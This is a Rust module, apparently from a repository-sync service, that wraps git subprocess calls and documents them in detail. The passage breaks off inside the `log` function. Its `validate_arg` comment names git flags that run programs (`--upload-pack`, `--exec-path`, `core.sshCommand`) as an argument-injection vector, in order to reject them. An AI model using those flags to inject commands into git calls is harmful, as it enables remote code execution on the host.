//! Git as a subprocess, one repo at a time.
//!
//! **This module is the engine's first `Command::new`.** Before it, the engine
//! read files, served them, and called Anthropic; it had never executed another
//! program. That is the single categorical change in the sync feature, and it is
//! deliberately confined to this file so the whole of the new authority can be
//! read in one sitting.
//!
//! Two rules hold everywhere below. **Never a shell** — every invocation is an
//! argv array, so there is no string for a metacharacter to live in. **No value
//! from a request ever becomes an argument** — the repo comes from the manifest
//! and every other argument is a literal in this file.
//!
//! The rejected alternative was `git2`/libgit2, which avoids the subprocess
//! entirely. It loses on the thing that decides whether a fetch works at all:
//! git's credential path. The SSH agent, the platform keychain helper,
//! `~/.gitconfig` and its `insteadOf` rules are what let a host reach its
//! remotes, and libgit2 reimplements a subset that diverges exactly there.
//! Shelling out is the narrower real risk despite being the scarier word.

use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;

/// The per-invocation cap. A fetch against an unreachable remote is the
/// expected failure here, not the exotic one — a laptop is asleep, a tailnet
/// is down, a host is off — and an uncapped fetch would hold a sweep open
/// until the network stack gave up on its own schedule.
pub const DEFAULT_TIMEOUT: Duration = Duration::from_secs(30);

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GitError {
    /// The invocation exceeded its cap and the child was killed.
    Timeout,
    /// git ran and failed — either it could not be spawned at all (not on
    /// PATH, an unusable repo path) or it exited nonzero (`require_ok`'s
    /// case). The two are not distinguished because no caller has yet needed
    /// to tell them apart.
    Failed(String),
    /// A request-derived value was refused before any subprocess ran.
    /// Distinct from `Failed` because it is the CALLER's input that was
    /// wrong, not git. The intended contract is that a future route handler
    /// turns this into 400 and the others into 500 — no such handler exists
    /// yet, but the variant is split now so telling them apart never depends
    /// on string-matching a message.
    InvalidArg(String),
}

#[derive(Debug, Clone)]
pub struct GitOutput {
    pub code: i32,
    pub stdout: String,
    pub stderr: String,
}

impl GitOutput {
    pub fn ok(&self) -> bool {
        self.code == 0
    }
}

/// Run one git command in `repo` and collect its output.
///
/// **A nonzero exit is `Ok`, not `Err`.** `rev-parse @{u}` exits 128 when a
/// branch tracks nothing, and that is the answer to "does it have an upstream",
/// not a malfunction. `Err` is reserved for the two cases where no answer
/// exists: the child could not be spawned, or it ran past its cap.
///
/// `stdin` is null. A git that inherits a live stdin can block forever on a
/// credential prompt — the one hang a timeout alone would merely convert into a
/// 30-second stall on every repo.
///
/// **This line has no test, deliberately.** A unit test can only observe it by
/// running a git that reads stdin and checking it returns — which proves
/// nothing unless the test binary's own stdin happens to be open, and under CI
/// it is already `/dev/null`, so such a test passes whether or not this line
/// survives. Rather than ship a green light that means nothing, the guarantee
/// is stated here and left unasserted. Delete this and the failure is a hang in
/// production, not a red suite. (David's ruling, 2026-07-31, after a review
/// caught the non-discriminating test.)
///
/// `kill_on_drop` is what makes the timeout real: `tokio::time::timeout` drops
/// the future, and without this the child would outlive it and keep running.
pub async fn run_git(
    repo: &Path,
    args: &[&str],
    timeout: Duration,
) -> Result<GitOutput, GitError> {
    let mut cmd = git_command(repo, args);

    match tokio::time::timeout(timeout, cmd.output()).await {
        Err(_) => Err(GitError::Timeout),
        Ok(Err(e)) => Err(GitError::Failed(e.to_string())),
        Ok(Ok(out)) => Ok(GitOutput {
            code: out.status.code().unwrap_or(-1),
            stdout: String::from_utf8_lossy(&out.stdout).trim().to_string(),
            stderr: String::from_utf8_lossy(&out.stderr).trim().to_string(),
        }),
    }
}

/// The one place a git subprocess is assembled.
///
/// `LC_ALL=C` is load-bearing, not hygiene: `push_action_error`'s three-way
/// stderr classification and the rev-parse discriminator key on git's English
/// words, and a localized git translates them — the substring match then
/// silently degrades every rejection to `"transport"`. The C locale pins the
/// words the classifiers stand on. (Survey 2026-08-06, weakness #1; only the
/// test fixture isolated env before this.)
fn git_command(repo: &Path, args: &[&str]) -> Command {
    let mut cmd = Command::new("git");
    cmd.arg("-C")
        .arg(repo)
        .args(args)
        .env("LC_ALL", "C")
        .stdin(Stdio::null())
        .kill_on_drop(true);
    cmd
}

/// True when the working tree has anything uncommitted, **including untracked
/// files**. `--porcelain` reports those by default and that is wanted: an
/// uncommitted edit is work, and a fast-forward must not act around it.
///
/// Unlike `newest_commit`, a git failure here is `Err`, not folded into
/// `Ok(false)`: `bool` has no natural "no answer" value the way
/// `Option<String>` does, so silently reporting "not dirty" would misrepresent
/// a status call that never actually ran.
pub async fn is_dirty(repo: &Path, timeout: Duration) -> Result<bool, GitError> {
    let out = run_git(repo, &["status", "--porcelain"], timeout).await?;
    if !out.ok() {
        return Err(GitError::Failed(out.stderr));
    }
    Ok(!out.stdout.is_empty())
}

/// The committer date of HEAD in strict ISO 8601 (`%cI`), or `None` in a repo
/// with no commits yet.
///
/// Committer date rather than author date on purpose: a rebased or
/// cherry-picked commit keeps its original author date, which would report a
/// repo as older than the work actually landing in it.
pub async fn newest_commit(repo: &Path, timeout: Duration) -> Result<Option<String>, GitError> {
    let out = run_git(repo, &["log", "-1", "--format=%cI"], timeout).await?;
    if !out.ok() || out.stdout.is_empty() {
        return Ok(None);
    }
    Ok(Some(out.stdout))
}

/// The full sha HEAD points at, or `None` in a repo with no commits yet.
///
/// **Deliberately not `newest_commit`**, which returns a committer DATE
/// (`%cI`). The two read the same commit and answer different questions, and
/// the names do not say so loudly enough: `repo_pulled`'s `before`/`after`
/// are shas everywhere else in this design, and filling them from
/// `newest_commit` would put an ISO timestamp in a field every reader takes
/// for a revision — a value whose name promises more than the wire asserts,
/// which is the exact defect class the previous build corrected ten instances
/// of.
///
/// `--verify --quiet` is what makes an unborn branch `Ok(None)` rather than an
/// error, matching `log`'s treatment of the same state.
pub async fn head_sha(repo: &Path, timeout: Duration) -> Result<Option<String>, GitError> {
    let out = run_git(repo, &["rev-parse", "--verify", "--quiet", "HEAD"], timeout).await?;
    if !out.ok() || out.stdout.is_empty() {
        return Ok(None);
    }
    Ok(Some(out.stdout))
}

/// `git rev-list --count <before>..<after>` — how many commits the push moved.
///
/// Deliberately NOT the ahead-count `status_v2` already holds: that is this
/// machine's belief BEFORE the push, not what the push moved. Same discipline
/// as reading the sha range from `--porcelain` — measure the thing, do not
/// infer it from a neighbouring number that usually agrees.
///
/// `before` and `after` originate in git's own output but flow back into an
/// argument position, so they pass `validate_arg` like any other value.
///
/// The `--` goes AFTER the range, not before it: it separates revisions from
/// pathspecs, so a range placed after it is parsed as a filename and git exits
/// with a usage dump. (Measured — the first version of this had it the other
/// way round, following the "`--` before value-shaped arguments" habit that is
/// correct for paths and backwards for revisions.)
pub async fn count_range(
    repo: &Path,
    before: &str,
    after: &str,
    timeout: Duration,
) -> Result<u32, GitError> {
    validate_arg(before)?;
    validate_arg(after)?;
    let range = format!("{before}..{after}");
    let out = run_git(repo, &["rev-list", "--count", &range, "--"], timeout).await?;
    if !out.ok() {
        return Err(GitError::Failed(out.stderr));
    }
    out.stdout
        .trim()
        .parse()
        .map_err(|_| GitError::Failed(format!("unparseable count {:?}", out.stdout)))
}

/// Where HEAD sits relative to its upstream.
///
/// **An enum over what is KNOWABLE, not over which fact wins.** A single
/// collapsed verdict ranking six conditions down to one would parse `ahead`,
/// use it once, and discard it, so a repo with three unpushed commits would
/// report as merely `Current`. Here `Detached` and `NoUpstream` are not
/// competing with "behind"; they are states in which "behind" has no
/// meaning, which is why they are variants and `ahead`/`behind` are fields
/// inside the one variant where they are defined.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[serde(tag = "kind", rename_all = "kebab-case")]
pub enum Position {
    Tracking { upstream: String, ahead: u32, behind: u32 },
    /// An upstream is configured but its remote-tracking ref is absent —
    /// merged and pruned, or never fetched. Ahead/behind are unknowable, and
    /// git says so by omitting `branch.ab` while still printing
    /// `branch.upstream`. Found by running the command rather than reasoning
    /// about it; live in this workspace on 2026-08-04.
    UpstreamGone { upstream: String },
    NoUpstream,
    Detached,
}

/// One changed path from `git status --porcelain=v2`.
///
/// `change` collapses git's much finer-grained XY vocabulary (M/A/D/R/C/T/U
/// in either the staged or unstaged slot) down to the five buckets a client
/// actually renders differently: `modified` / `added` / `deleted` /
/// `renamed` / `untracked`. Anything not distinctly added, deleted, or
/// renamed reads as `modified` — including a bare type-change (`T`), for
/// which no caller has yet asked for a sixth bucket.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct ChangedFile {
    pub path: String,
    pub change: &'static str,
    /// Whether the change is staged (present in the index) — the first XY
    /// character is not `.`. An untracked file is never staged by
    /// definition, so this is always `false` for that kind.
    pub staged: bool,
}

/// Everything one `git status --porcelain=v2 --branch` yields.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct StatusV2 {
    pub head: Option<String>,
    pub branch: Option<String>,
    pub position: Position,
    pub dirty_files: u32,
    /// Every changed path, parsed once from the SAME output `dirty_files`
    /// counts — `routes::repos::changes` reads this rather than forking a
    /// second `git status`. Order is git's own (unspecified, effectively
    /// alphabetical within each section); no caller has needed to reorder it.
    pub files: Vec<ChangedFile>,
}

/// Parse `--porcelain=v2 --branch` output.
///
/// Header lines begin `# `; everything else is one changed path. The four
/// positions fall out of which headers are PRESENT — git omits
/// `branch.upstream` when nothing is tracked and omits `branch.ab` when the
/// tracking ref is missing, so absence carries the meaning and the parser
/// needs no sentinel for "undefined".
///
/// Unparseable `branch.ab` degrades to `UpstreamGone` rather than to
/// `Tracking { 0, 0 }`: the first says "we don't know", the second says
/// "you're up to date", and only one of those is honest about a line we
/// failed to read.
pub fn parse_status_v2(stdout: &str) -> StatusV2 {
    let mut head = None;
    let mut branch = None;
    let mut upstream: Option<String> = None;
    let mut ab: Option<(u32, u32)> = None;
    let mut dirty_files = 0u32;
    let mut files = Vec::new();

    for line in stdout.lines() {
        let Some(header) = line.strip_prefix("# ") else {
            if !line.trim().is_empty() {
                dirty_files += 1;
                // Kept separate from `dirty_files` above deliberately: a line
                // this parser fails to recognize (a future porcelain kind, an
                // `!` ignored entry) still counts toward the total rather than
                // vanishing, but it is simply absent from `files` rather than
                // panicking or forcing a placeholder entry with no real path.
                if let Some(entry) = parse_changed_line(line) {
                    files.push(entry);
                }
            }
            continue;
        };
        let mut parts = header.splitn(2, ' ');
        match (parts.next(), parts.next()) {
            (Some("branch.oid"), Some(v)) => {
                let v = v.trim();
                // git prints this literal, rather than an oid, for a repo
                // with no commits yet (`git init` with nothing committed) —
                // verified live 2026-08-04. There is no HEAD to name, so the
                // design's contract for that case (`head: None`) applies the
                // same way it already does for a detached-HEAD branch name.
                if v != "(initial)" {
                    head = Some(v.to_string());
                }
            }
            (Some("branch.head"), Some(v)) => {
                let v = v.trim();
                // git prints this literal for a detached HEAD, but a branch
                // actually named "(detached)" is indistinguishable here and
                // is misread as detached too — porcelain v2's own format
                // carries no marker beyond the string itself, so this parser
                // inherits the ambiguity. Closing it costs a second fork per
                // repo (`git symbolic-ref -q HEAD`), spent to guard a branch
                // name nobody uses; deliberately not paid, because both
                // readings block the identical set of verbs.
                if v != "(detached)" {
                    branch = Some(v.to_string());
                }
            }
            (Some("branch.upstream"), Some(v)) => upstream = Some(v.trim().to_string()),
            (Some("branch.ab"), Some(v)) => ab = parse_ab(v),
            _ => {}
        }
    }

    let position = match (branch.is_some(), upstream, ab) {
        (false, _, _) => Position::Detached,
        (true, None, _) => Position::NoUpstream,
        (true, Some(u), None) => Position::UpstreamGone { upstream: u },
        (true, Some(u), Some((ahead, behind))) => {
            Position::Tracking { upstream: u, ahead, behind }
        }
    };

    StatusV2 { head, branch, position, dirty_files, files }
}

/// `+3 -1` -> `(3, 1)`. `None` on anything else.
fn parse_ab(value: &str) -> Option<(u32, u32)> {
    let mut parts = value.split_whitespace();
    let ahead = parts.next()?.strip_prefix('+')?.parse().ok()?;
    let behind = parts.next()?.strip_prefix('-')?.parse().ok()?;
    Some((ahead, behind))
}

/// Parse one non-header porcelain v2 line into a `ChangedFile`.
///
/// Porcelain v2 line kinds, and the fixed field count before the path that
/// each one carries (see `git-status(1)`'s PORCELAIN V2 section):
///
/// - `1 XY sub mH mI mW hH hI path` — ordinary change, 8 fields before path.
/// - `2 XY sub mH mI mW hH hI Xscore path<TAB>origPath` — rename/copy, 9
///   fields before the path pair; the path and its origin are TAB-separated
///   in what would otherwise be a single space-delimited field, which is why
///   this is its own line kind rather than a variant of `1`.
/// - `u XY sub m1 m2 m3 mW h1 h2 h3 path` — unmerged, 10 fields before path.
/// - `? path` — untracked, 1 field before path.
///
/// `None` for anything else (a bare `!` ignored-entry line, or a line this
/// parser does not recognize) — the caller still counts it toward
/// `dirty_files` from the raw line count, so nothing is silently dropped
/// from the total, only from this finer-grained list.
fn parse_changed_line(line: &str) -> Option<ChangedFile> {
    match line.as_bytes().first()? {
        b'1' => {
            let parts: Vec<&str> = line.splitn(9, ' ').collect();
            let xy = parts.get(1)?;
            Some(ChangedFile {
                path: (*parts.get(8)?).to_string(),
                change: classify_xy(xy),
                staged: staged_xy(xy),
            })
        }
        b'2' => {
            let parts: Vec<&str> = line.splitn(10, ' ').collect();
            let xy = parts.get(1)?;
            // The 10th field is "path<TAB>origPath" — the destination path is
            // what a client renders as THE path; the origin is not surfaced
            // (no caller has asked to show "renamed from X" yet).
            let path = parts.get(9)?.split('\t').next()?.to_string();
            Some(ChangedFile { path, change: classify_xy(xy), staged: staged_xy(xy) })
        }
        b'u' => {
            let parts: Vec<&str> = line.splitn(11, ' ').collect();
            let xy = parts.get(1)?;
            // Always "modified", never derived from XY: an unmerged entry's
            // XY letters (AA, UU, DD, AU, UD, ...) describe a MERGE CONFLICT,
            // not an add or delete in the ordinary sense, and forcing that
            // vocabulary onto this line kind would misname a state none of
            // the other four buckets actually describes.
            Some(ChangedFile {
                path: (*parts.get(10)?).to_string(),
                change: "modified",
                staged: staged_xy(xy),
            })
        }
        b'?' => {
            let parts: Vec<&str> = line.splitn(2, ' ').collect();
            Some(ChangedFile {
                path: (*parts.get(1)?).to_string(),
                change: "untracked",
                // Untracked by definition has nothing in the index.
                staged: false,
            })
        }
        _ => None,
    }
}

/// Collapse an XY status pair to one of the four non-untracked buckets.
///
/// Checked in this order — rename/copy, then added, then deleted, falling
/// through to modified — because a real git XY never sets more than one of
/// these at once for kinds `1`/`2`/`u`, so the order only matters for the
/// fallback case (a letter this function does not otherwise recognize, e.g.
/// `T` for a type-change) that always lands on `modified`.
fn classify_xy(xy: &str) -> &'static str {
    let mut chars = xy.chars();
    let x = chars.next().unwrap_or('.');
    let y = chars.next().unwrap_or('.');
    if x == 'R' || y == 'R' || x == 'C' || y == 'C' {
        "renamed"
    } else if x == 'A' || y == 'A' {
        "added"
    } else if x == 'D' || y == 'D' {
        "deleted"
    } else {
        "modified"
    }
}

/// Whether the INDEX half of an XY pair is set — the first character is
/// anything other than `.`.
fn staged_xy(xy: &str) -> bool {
    xy.chars().next().is_some_and(|x| x != '.')
}

/// One `git status --porcelain=v2 --branch` — branch, upstream, ahead,
/// behind, and every changed path, in a single fork.
///
/// Replaces four invocations (`rev-parse --abbrev-ref HEAD`, `rev-parse
/// @{u}`, `rev-list --left-right --count`, `status --porcelain`) with one,
/// which is the entire cost argument for taking the list route from six
/// processes per repo down to one. `git2`/libgit2 was rejected for this at
/// the module level (see the file header) on credential-path grounds, not
/// performance, so the fork count is what this function alone is paid to fix.
pub async fn status_v2(repo: &Path, timeout: Duration) -> Result<StatusV2, GitError> {
    let out = run_git(repo, &["status", "--porcelain=v2", "--branch"], timeout).await?;
    if !out.ok() {
        return Err(GitError::Failed(out.stderr));
    }
    Ok(parse_status_v2(&out.stdout))
}

/// When this repo last successfully reached its remote, ISO 8601.
///
/// The mtime of `.git/FETCH_HEAD` — but git does NOT reserve that write for a
/// fetch that reached the remote. **Verified live 2026-08-04 against git
/// 2.50.1: a fetch that FAILS to contact its remote TRUNCATES `FETCH_HEAD` to
/// zero bytes and bumps its mtime doing so** — a successful fetch against a
/// bare remote wrote 174 bytes; pointing the same repo's origin at a
/// nonexistent path and fetching again left a byte-identical-in-emptiness,
/// freshly-stamped `FETCH_HEAD`. Read naively, that made a fetch that never
/// reached the network report as "just now" — a repo going from "never
/// fetched" to "fetched just now" by way of a fetch that failed. A
/// **non-empty** file, not merely a present one, is what means "last
/// successful contact"; an empty one is answered as `None`, the same as no
/// file at all. A successful fetch that finds nothing new still writes a
/// non-empty `FETCH_HEAD` (it records the remote ref list, not a diff), so
/// this creates no false negative for the ordinary "nothing new" case.
///
/// A filesystem stat, not a subprocess, deliberately: this runs for every
/// composed repo on every list read, and one `git` fork per repo is exactly
/// the cost the porcelain-v2 collapse (`parse_status_v2`) was paid to avoid.
///
/// Formatted with `humantime::format_rfc3339_seconds`, not `chrono` — chrono
/// is not a dependency of this crate, and `humantime` already is (see
/// `sessions.rs`'s event timestamps for the same idiom at millis
/// resolution). Seconds here, not millis: a fetch time is read by a human as
/// "22 minutes ago," and sub-second precision is noise nobody asked for.
///
/// **Consequence, stated rather than left for a reader to trip over:** this
/// makes `last_fetch` UTC with a `Z` suffix, while `newest_commit` above
/// keeps git's own `%cI` — local time with a numeric offset. Both are valid
/// ISO 8601, and both parse with `Date.parse` on the client; the divergence
/// is deliberate, not drift — one timestamp comes from git's formatter, the
/// other from ours, and neither has a reason to imitate the other's zone.
///
/// `None` when the file is absent (never fetched — note that a fresh CLONE
/// has no `FETCH_HEAD`, because cloning is not fetching), empty (the last
/// fetch failed to reach the remote), or its mtime is unreadable.
pub fn last_fetch(repo: &Path) -> Option<String> {
    let meta = std::fs::metadata(repo.join(".git").join("FETCH_HEAD")).ok()?;
    // A failed fetch truncates this file to zero bytes rather than leaving it
    // absent — see this function's doc comment. Only a non-empty file is
    // evidence the remote was actually reached.
    if meta.len() == 0 {
        return None;
    }
    let modified = meta.modified().ok()?;
    Some(humantime::format_rfc3339_seconds(modified).to_string())
}

/// Linked working trees sharing this repo's `.git`.
///
/// A `read_dir` of the `worktrees/` directory that `git worktree add`
/// populates with one directory per linked tree. Counts linked trees ONLY —
/// the checkout being read is not among them, which is why an ordinary main
/// checkout with one linked tree answers 1 and `git worktree list` prints two
/// lines.
///
/// **`repo`'s own `.git` may be a directory OR a file**, and both are
/// resolved to the same family directory. A main checkout's `.git` is a
/// directory, and `worktrees/` sits directly inside it. A linked worktree's
/// `.git` is instead a FILE — `gitdir: <path-into-the-main-checkout's>
/// worktrees/<name>` — and reading THAT `<name>` directory's *parent* lands
/// back on the one shared `worktrees/` directory, so a linked tree reports
/// the same family count the main checkout would. Getting this wrong reads
/// as data loss rather than a missing feature: before this resolution
/// existed, `read_dir` on a linked tree's (nonexistent) `<repo>/.git/
/// worktrees/` failed and `unwrap_or(0)` turned that failure into the exact
/// same `0` a healthy solo checkout reports — "I could not look" and "there
/// is nothing here" are different facts, and only one of them is true. Found
/// live in review, 2026-08-04.
///
/// A submodule's `.git` is a file too (`gitdir: ../.git/modules/<name>`), but
/// that path's parent is named `modules/`, not `worktrees/` —
/// `worktree_family_dir` returns `None` for it and this answers a genuine 0,
/// not a swallowed error.
///
/// What is still swallowed to 0, and left that way as an accepted
/// conflation at this level: a `.git` that is neither a readable directory
/// nor a readable file (permissions, a dangling mount) is indistinguishable
/// from "no linked trees." Both a stat and a `read_dir` failure earn a
/// `bool`-shaped "no answer" the same way `is_dirty`'s comment discusses for
/// its own case, and a `u32` has no natural way to carry that distinction
/// without becoming an `Option`, which no caller of this v1 needs yet.
///
/// Counted, never enumerated or actioned, in v1 (design D9).
pub fn worktree_count(repo: &Path) -> u32 {
    let dot_git = repo.join(".git");
    let worktrees_dir = match std::fs::metadata(&dot_git) {
        Ok(meta) if meta.is_dir() => dot_git.join("worktrees"),
        Ok(_file) => match worktree_family_dir(repo, &dot_git) {
            Some(dir) => dir,
            None => return 0,
        },
        Err(_) => return 0,
    };
    std::fs::read_dir(worktrees_dir)
        .map(|entries| entries.flatten().count() as u32)
        .unwrap_or(0)
}

/// Resolve a `.git` FILE (`gitdir: <path>`) to the shared `worktrees/`
/// directory it points into — `None` when it points somewhere else, which is
/// how a submodule's `gitdir: ../.git/modules/<name>` is told apart from a
/// linked worktree's `gitdir: /.../worktrees/<name>`: only the latter's
/// PARENT is named `worktrees`.
///
/// The path after `gitdir:` is absolute for a linked worktree and typically
/// relative for a submodule (`../.git/modules/<name>`, verified live against
/// both cases 2026-08-04) — resolved against `repo`, not the process's cwd,
/// via `Path::join`, whose stdlib-documented behavior already does the right
/// thing for both: joining an absolute path onto `repo` discards `repo` and
/// keeps the absolute one; joining a relative path appends it.
fn worktree_family_dir(repo: &Path, dot_git_file: &Path) -> Option<PathBuf> {
    let contents = std::fs::read_to_string(dot_git_file).ok()?;
    let raw = contents.trim().strip_prefix("gitdir:")?.trim();
    let parent = repo.join(raw).parent()?.to_path_buf();
    (parent.file_name()? == "worktrees").then_some(parent)
}

/// Whether the repo declares submodules. They are fetched, never updated —
/// a fast-forward moves the POINTER and leaves the submodule checkout where
/// it was, and a limit nobody can see reads as a bug.
pub fn has_submodules(repo: &Path) -> bool {
    repo.join(".gitmodules").exists()
}

/// `git fetch --prune`.
///
/// Touches no working tree and no branch, which is why the sweep runs it
/// unconditionally — on the dirty feature branch too. It is what makes the
/// report *true* rather than a reading of whatever the last fetch happened to
/// leave behind.
///
/// A repo with no remote configured is an `Err`, not a silent success: the
/// sweep reports it rather than counting it as fetched.
///
/// The `git remote` pre-check exists because `git fetch --prune` on a repo
/// with zero remotes configured is not itself a failure — it exits 0 with no
/// output, having correctly done nothing. That is the right answer to "did
/// the fetch fail," but the wrong one to "is there anything here to sync,"
/// which is the question this function actually answers for the sweep.
pub async fn fetch(repo: &Path, timeout: Duration) -> Result<(), GitError> {
    let remotes = run_git(repo, &["remote"], timeout).await?;
    if !remotes.ok() {
        return Err(GitError::Failed(remotes.stderr));
    }
    if remotes.stdout.trim().is_empty() {
        return Err(GitError::Failed("no remote configured".to_string()));
    }

    require_ok(
        run_git(repo, &["fetch", "--prune"], timeout).await?,
        "git fetch",
    )
}

/// Turn a nonzero exit into a `Failed`, naming the command when git itself
/// said nothing.
///
/// One implementation, added 2026-07-31 on David's ruling after a review found
/// this block written out verbatim in both `fetch` and `pull_ff`. The
/// module already had an idiom for a hard-fail exit (`is_dirty`, and `fetch`'s
/// own `git remote` pre-check); a second one inlined in two places is how a
/// third caller ends up copying the wrong one.
fn require_ok(out: GitOutput, cmd: &str) -> Result<(), GitError> {
    if out.ok() {
        return Ok(());
    }
    Err(GitError::Failed(if out.stderr.is_empty() {
        format!("{cmd} exited {}", out.code)
    } else {
        out.stderr
    }))
}

/// `git merge --ff-only @{u}`.
///
/// The whole safety argument of this feature is this one flag. The merge
/// succeeds only when the local branch is a strict ancestor of upstream, so a
/// conflict is structurally impossible rather than handled, no merge commit is
/// ever created, and a diverged branch is refused with HEAD unmoved.
///
/// The one production caller, `routes::repos::pull`, first checks `is_dirty`
/// and refuses before ever reaching here — so the working tree is already
/// known clean by the time this runs. Whether the branch is actually behind
/// is NOT independently established beforehand; that is left to git's own
/// `--ff-only` refusal. Either gate missing is still safe — git refuses on a
/// diverged or non-fast-forwardable branch regardless — but the response
/// would then carry a failure the caller could have predicted.
pub async fn pull_ff(repo: &Path, timeout: Duration) -> Result<(), GitError> {
    require_ok(
        run_git(repo, &["merge", "--ff-only", "@{u}"], timeout).await?,
        "git merge --ff-only",
    )
}

/// Reject a request-derived value that git would read as a flag.
///
/// Argv already defeats the shell — there is no string for a metacharacter to
/// live in. It does NOT defeat git's own argument parsing: a value beginning
/// with `-` is a flag, and git has flags that execute programs
/// (`--upload-pack`, `--exec-path`, `-c core.sshCommand=…`). That is a known
/// RCE class and it survives every shell-injection defence.
///
/// Callers additionally pass `--` before value-shaped arguments. Both, not
/// either: this is the rule, and `--` is what makes forgetting it survivable.
pub fn validate_arg(value: &str) -> Result<(), GitError> {
    if value.starts_with('-') {
        return Err(GitError::InvalidArg(format!(
            "refusing a value that git would read as a flag: {value:?}"
        )));
    }
    Ok(())
}

/// What the REMOTE moved, as git itself reported it.
///
/// Every field is optional and stays absent rather than being defaulted. A new
/// branch has no `before` because there was nothing to move from, and an
/// up-to-date push moved nothing at all — in both cases a zero-filled sha
/// would be a fabrication with the shape of a measurement.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct PushReport {
    pub reference: Option<String>,
    pub before: Option<String>,
    pub after: Option<String>,
}

/// Parse `git push --porcelain` stdout.
///
/// The format is one tab-separated line per ref — `<flag>\t<from>:<to>\t<summary>`
/// — wrapped by a `To <remote>` header and a `Done` trailer. The flag is a
/// single character (a SPACE for a fast-forward, `*` new, `=` up to date, `!`
/// rejected, `+` forced, `-` deleted) and the summary is `<old>..<new>` for a
/// fast-forward and a bracketed phrase for everything else.
///
/// **Only a summary matching `<hex>..<hex>` yields shas.** Anything else yields
/// none, including a format this function does not recognise — a future git
/// must produce "we don't know", never a plausible pair.
///
/// Shapes below are transcribed from live `git push --porcelain` runs against a
/// scratch remote (2026-08-08, git 2.x/macOS), not from documentation.
pub fn parse_porcelain(stdout: &str) -> PushReport {
    for line in stdout.lines() {
        let mut fields = line.split('\t');
        let _flag = fields.next();
        let Some(refspec) = fields.next() else { continue };
        let Some(summary) = fields.next() else { continue };
        let Some((_from, to)) = refspec.split_once(':') else { continue };
        if !to.starts_with("refs/") {
            continue;
        }

        let (before, after) = match summary.split_once("..") {
            Some((b, a))
                if !b.is_empty()
                    && !a.is_empty()
                    && b.chars().all(|c| c.is_ascii_hexdigit())
                    && a.chars().all(|c| c.is_ascii_hexdigit()) =>
            {
                (Some(b.to_string()), Some(a.to_string()))
            }
            _ => (None, None),
        };
        return PushReport { reference: Some(to.to_string()), before, after };
    }
    PushReport::default()
}

/// `git push --porcelain`.
///
/// **No `--force`, no `--force-with-lease`, no refspec, no branch argument** —
/// the branch and its upstream come from the repo's own config, so nothing here
/// is request-derived. `--porcelain` is a REPORTING flag: it changes what git
/// prints, never what git does. That distinction is the whole content of the
/// `push` grant, whose wording in `modules.local.toml` was updated in the same
/// change that added this flag rather than left to contradict the code.
///
/// A non-fast-forward is a nonzero exit and therefore an `Err`, and that is
/// still the whole safety story: a diverged branch is refused by git rather
/// than resolved by us.
///
/// # Why the failure message carries stdout, and why that is not cosmetic
///
/// `require_ok` is deliberately NOT used here. It builds its message from
/// stderr alone, which is correct for every other verb and **wrong for a
/// porcelain push**: measured 2026-08-08, `--porcelain` moves the per-ref
/// status line — the only text carrying `[rejected]` or `[remote rejected]` —
/// from stderr onto STDOUT, leaving stderr with nothing but the generic
/// `error: failed to push some refs to '<remote>'`.
///
/// `routes::repos::push_action_error` classifies on exactly those two markers.
/// Had this reported stderr alone, both `not-fast-forwardable` and
/// `refused-by-remote` would have silently collapsed to `transport` — a
/// two-thirds loss of the taxonomy, invisible from the happy path and
/// invisible to any test that exercises a no-upstream failure (which carries
/// no marker either way, and whose stdout under `--porcelain` is empty).
///
/// So the report is prepended to the message: the discriminator survives the
/// flag that displaced it. Asserted end-to-end, per classified variant, by
/// `routes::repos`'s `each_rejection_keeps_its_kind_under_the_porcelain_flag`.
pub async fn push(repo: &Path, timeout: Duration) -> Result<PushReport, GitError> {
    let out = run_git(repo, &["push", "--porcelain"], timeout).await?;
    if !out.ok() {
        let joined = match (out.stdout.trim(), out.stderr.trim()) {
            ("", "") => format!("git push exited {}", out.code),
            ("", e) => e.to_string(),
            (o, "") => o.to_string(),
            (o, e) => format!("{o}\n{e}"),
        };
        return Err(GitError::Failed(joined));
    }
    Ok(parse_porcelain(&out.stdout))
}

/// One entry from `git log`, before anything knows about upstream state.
///
/// Deliberately carries no `unpushed` field: that fact is computed by the
/// caller (`routes::repos::log`) from `Position::Tracking { ahead, .. }`,
/// which this module has no reason to fetch a second time.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct LogEntry {
    pub sha: String,
    pub subject: String,
    pub author: String,
    pub date: String,
}

/// The most recent `limit` commits reachable from HEAD, newest first.
///
/// One invocation, `%x00`-separated fields — a NUL cannot appear in a sha, an
/// author name, or an ISO date, so splitting on it is unambiguous in a way no
/// printable delimiter (`|`, `\t`) could promise, since any of those CAN
/// appear in a commit's metadata.
///
/// **The subject is the field to think about, and `%s` already settles it**:
/// git's own `%s` placeholder is the commit message's first PARAGRAPH (the
/// text up to the first blank line), with any line breaks WITHIN that
/// paragraph joined by a single space — verified live: a two-line first
/// paragraph followed by a blank line and a body renders under `%s` as those
/// two lines joined with `" "`, and the body paragraph is dropped entirely,
/// not appended. So a raw newline inside one entry's fields cannot occur
/// (an embedded break becomes a space, never a newline, and anything past
/// the first blank line never reaches `%s` at all), and splitting entries
/// on `\n` needs no separate escaping scheme for the subject.
///
/// `limit` is always a `u32` rendered as a plain decimal by the caller — it
/// can never begin with `-` and be read as a flag, so no `validate_arg` call
/// is needed here.
pub async fn log(repo: &Path, limit: u32, timeout: Duration) -> Result<Vec<LogEntry>, GitError> {
    let n = limit.to_string();
    let out = run_git(
        repo,
        &["log", "--format=%H%x00%s%x00%an%x00%cI", "-n", &n],
        timeout,
    )
    .await?;
    if !out.ok() {
        // A nonzero exit here has two real causes that read as OPPOSITE
        // facts: an unborn branch (`git init` with no commits yet — a fact
        // about the repo's history, not a malfunction) and a genuine read
        // failure (a corrupt loose object, a damaged pack, or a repo git
        // cannot even open — deleted `objects/`, a garbage `HEAD`, a stale
        // linked worktree whose gitdir was removed out from under it).
        // Verified live 2026-08-04/05: an unborn branch and a corrupt-object
        // repo produce the identical shape from this invocation — exit 128,
        // empty stdout, a message on stderr — so exit code and stdout
        // emptiness alone cannot tell them apart. A repo git cannot open
        // ALSO exits 128 with a `fatal: not a git repository` message on
        // stderr, so it needs the same discriminator, not a special case.
        // Folding every nonzero exit to `Ok(vec![])` launders a genuine read
